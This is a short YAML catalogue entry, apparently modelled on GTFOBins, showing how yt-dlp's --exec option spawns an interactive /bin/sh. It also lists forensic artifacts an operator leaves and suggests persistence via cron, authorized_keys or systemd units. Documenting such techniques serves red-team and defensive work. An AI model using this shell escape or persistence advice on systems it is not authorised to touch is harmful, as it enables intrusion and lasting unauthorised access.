---
name: yt-dlp
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: 'yt-dlp ''https://www.youtube.com/watch?v=xxxxxxxxxxx'' --exec ''/bin/sh #'''
  notes: The URL must point to a valid YouTube video which will be actually downloaded.
references:
- https://gtfobins.github.io/gtfobins/yt-dlp/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
